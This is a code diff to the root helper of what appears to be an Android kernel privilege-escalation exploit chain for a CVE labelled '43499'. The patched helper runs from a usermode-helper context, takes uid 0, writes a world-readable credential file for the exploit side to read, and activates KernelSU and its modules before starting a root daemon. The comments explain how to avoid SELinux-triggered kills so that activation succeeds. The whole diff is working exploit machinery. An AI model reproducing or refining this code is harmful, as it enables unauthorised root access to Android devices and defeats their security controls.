@@ -30,6 +30,9 @@
 #include <unistd.h>
 
 #define BOOTSTRAP_SOCK_PATH "/data/local/tmp/temp_su.sock"
+/* Must match ROOT_CREDS_SENTINEL in common.h - this helper is built standalone and does not
+ * include common.h, the same way BOOTSTRAP_SOCK_PATH mirrors ROOT_SOCKET_PATH in root.c. */
+#define ROOT_CREDS_SENTINEL "/data/local/tmp/temp_su.creds"
 #define HOLD_READY_SOCKET "cve43499_roothold"
 #define SH_PATH "/system/bin/sh"
 #define KSU_LATE_LOAD_LOCK_PATH "/data/local/tmp/.cve43499-lateload.lock"
@@ -1124,13 +1127,25 @@ static void heal_work_dir(void) {
   }
   chown("/data/local/tmp", 2000, 2000);
   chmod("/data/local/tmp", 0771);
-  setxattr("/data/local/tmp", "security.selinux",
-           "u:object_r:shell_data_file:s0",
-           sizeof("u:object_r:shell_data_file:s0") - 1, 0);
+  /* DO NOT relabel /data/local/tmp here.
+   *
+   * setxattr(2) on "security.selinux" is the "policy-touching syscall" this file's own
+   * daemon_main() comment warns about: it kills the process outright when invoked from the
+   * UMH-exec'd helper, which runs on the kernel's cred/security context
+   * ("observed live: socket bound, process gone, activation stranded"). Because
+   * heal_work_dir() is the FIRST statement of run_activation_sequence(), that kill happened
+   * before the activation log was ever opened - so the run left no ksu-activate.log and no
+   * verdict at all, which is exactly the "activation silently never ran" symptom.
+   *
+   * The relabel is also unnecessary: /data/local/tmp is a stock Android directory already
+   * labelled shell_data_file, and every file this code creates there (the creds sentinel, the
+   * activation log, the socket) is created successfully without it. Verified on device: the
+   * creds file is created and read back fine. So drop the xattr writes rather than
+   * re-attempting them; if a future policy really does need a relabel, it belongs on the
+   * app side, where the process actually has a domain allowed to write that xattr. */
   if (stat("/data/local", &st) == 0) {
-    setxattr("/data/local", "security.selinux",
-             "u:object_r:shell_data_file:s0",
-             sizeof("u:object_r:shell_data_file:s0") - 1, 0);
+    /* owner/mode only, no security.selinux write */
+    chmod("/data/local", st.st_mode & 07777);
   }
 }
 
@@ -1139,6 +1154,14 @@ static void run_activation_sequence(void) {
   int log_fd = open(ACTIVATE_LOG_PATH,
                     O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0644);
   if (log_fd >= 0) {
+    /* Start each attempt from a clean file. The log is O_APPEND and /data/local/tmp survives
+     * reboots, so a partial or all-NUL file from an earlier attempt would otherwise be read
+     * as this run's output. (Measured: a stale log presented as 53 bytes of NUL, which is what
+     * made a completed activation look like nothing had happened.) */
+    if (ftruncate(log_fd, 0) != 0) {
+      dprintf(STDERR_FILENO, "[activate] ftruncate failed errno=%d\n", errno);
+    }
+    lseek(log_fd, 0, SEEK_END);
     /* The shell-domain runner polls this log for "[activate] done".
      * Opened as root the file ends up root:root 0600 (and O_CREAT does
      * not change the mode of a pre-existing file), so the runner's
@@ -1155,14 +1178,29 @@ static void run_activation_sequence(void) {
       close(log_fd);
     }
   } else {
-    /* SELinux may deny creating the log in shell_data_file depending on
-     * policy version; never let that abort activation. */
-    int nul = open("/dev/null", O_WRONLY | O_CLOEXEC);
-    if (nul >= 0) {
-      dup2(nul, STDOUT_FILENO);
-      dup2(nul, STDERR_FILENO);
-      if (nul > STDERR_FILENO) {
-        close(nul);
+    /* Could not create the activation log where the shell-domain runner expects it. Do NOT
+     * throw the diagnostics away: fall back to appending them to the creds sentinel, which
+     * is in the same directory and IS created successfully on this device. Measured: the log
+     * open failed on device, so activation ran (creds showed activate=0) while producing no
+     * ksu-activate.log at all - the run looked like nothing had happened. Appending here
+     * keeps the verdict and the reason in a file we have proven we can read. */
+    int fallback = open(ROOT_CREDS_SENTINEL, O_WRONLY | O_APPEND | O_CLOEXEC);
+    if (fallback >= 0) {
+      dup2(fallback, STDOUT_FILENO);
+      dup2(fallback, STDERR_FILENO);
+      if (fallback > STDERR_FILENO) {
+        close(fallback);
+      }
+      dprintf(STDERR_FILENO, "[activate] log-open-failed errno=%d; logging to %s\n", errno,
+              ROOT_CREDS_SENTINEL);
+    } else {
+      int nul = open("/dev/null", O_WRONLY | O_CLOEXEC);
+      if (nul >= 0) {
+        dup2(nul, STDOUT_FILENO);
+        dup2(nul, STDERR_FILENO);
+        if (nul > STDERR_FILENO) {
+          close(nul);
+        }
       }
     }
   }
@@ -1731,6 +1769,86 @@ static int umh_main(int argc, char **argv) {
   if (setresgid(0, 0, 0) != 0 || setresuid(0, 0, 0) != 0 ||
       getuid() != 0 || geteuid() != 0 || getgid() != 0 || getegid() != 0) {
     return 125;
+  }
+  /* Publish the credentials this process ACTUALLY holds, so the caller's success report is
+   * measured rather than inferred. The exploit side reads this file and reports the real
+   * uid instead of assuming 0 because the daemon socket appeared. Written with the real
+   * euid, never a hardcoded constant. */
+  {
+    char banner[96];
+    int banner_length = snprintf(banner, sizeof(banner),
+                                 "uid=%u euid=%u gid=%u egid=%u pid=%d\n",
+                                 (unsigned)getuid(), (unsigned)geteuid(),
+                                 (unsigned)getgid(), (unsigned)getegid(),
+                                 (int)getpid());
+    if (banner_length > 0) {
+      /* 0644, not 0600: the unprivileged caller has to be able to READ this back. A 0600
+       * root-owned file proves a root process exists (the shell gets EACCES) but cannot be
+       * quoted as a uid measurement, and "proof by permission denied" is weaker evidence
+       * than the file's own contents. The content is not a secret - it is a credential
+       * report, and it is only meaningful because the kernel that wrote it is the one
+       * running this code. */
+      int sentinel = open(ROOT_CREDS_SENTINEL, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC,
+                          0644);
+      if (sentinel >= 0) {
+        if (write(sentinel, banner, (size_t)banner_length) != banner_length) {
+          dprintf(STDERR_FILENO, "[umh] short creds write: %s\n", strerror(errno));
+        }
+        /* Defeat umask so the mode is exactly 0644 regardless of the inherited umask. */
+        fchmod(sentinel, 0644);
+        fsync(sentinel);
+        close(sentinel);
+      }
+    }
+  }
+
+  /* Do the KernelSU activation HERE, in this process, while uid 0 is a proven fact.
+   *
+   * The previous design deferred activation to a daemon-side watcher that waited for the
+   * runner to drop /data/local/tmp/.cve43499-activate. Measured on device, that chain never
+   * completed even when root was obtained: the marker was never observed, ksu-activate.log
+   * was never created, and the daemon plus its forked watcher were both gone by the next
+   * check (its recorded pid had already been recycled by an unrelated process). So the
+   * handoff had three independent failure points - a shell-domain marker write, a SELinux
+   * socket connect, and daemon lifetime - and activation depended on all three.
+   *
+   * None of that is necessary. run_activation_sequence() is self-contained: it opens its own
+   * log (fchown'd to 2000:2000 so the shell-domain runner can still read "[activate] done"),
+   * takes the cross-process flock, and performs the late-load plus module activation from
+   * whatever root context calls it. This process IS that context, and it already exists.
+   *
+   * Run it BEFORE daemon_main() so activation cannot be lost if the socket bind is what
+   * kills the daemon (the code's own comment records "socket bound, process gone,
+   * activation stranded"). Forks and waits so the helper's own descriptors stay sane, and
+   * stays idempotent via the lock plus modules_done_this_boot().
+   *
+   * Nothing here is persistent: no partition, no system image, no boot-time hook. The only
+   * state is the boot-scoped markers in /data/local/tmp that the sequence already uses. */
+  {
+    /* The activation sequence was written to run inside daemon_main(), which calls
+     * set_root_env() first. Now that it runs here, before that, it must set the same
+     * environment itself: the late-load execs logcat and globs ksud out of
+     * /data/local/tmp, and HOME/PATH/USER are part of what it was written against. */
+    set_root_env();
+    pid_t act = fork();
+    if (act == 0) {
+      run_activation_sequence();
+      _exit(0);
+    }
+    int act_status = (act > 0) ? wait_status(act) : -1;
+    /* Append the activation verdict to the creds report so the caller gets ONE file that
+     * answers both "were we really root" and "did KSU actually load". */
+    int report = open(ROOT_CREDS_SENTINEL, O_WRONLY | O_APPEND | O_CLOEXEC);
+    if (report >= 0) {
+      char line[64];
+      int n = snprintf(line, sizeof(line), "activate=%d\n", act_status);
+      if (n > 0 && write(report, line, (size_t)n) != n) {
+        dprintf(STDERR_FILENO, "[umh] short activate write\n");
+      }
+      fchmod(report, 0644);
+      fsync(report);
+      close(report);
+    }
   }
   return daemon_main();
 }
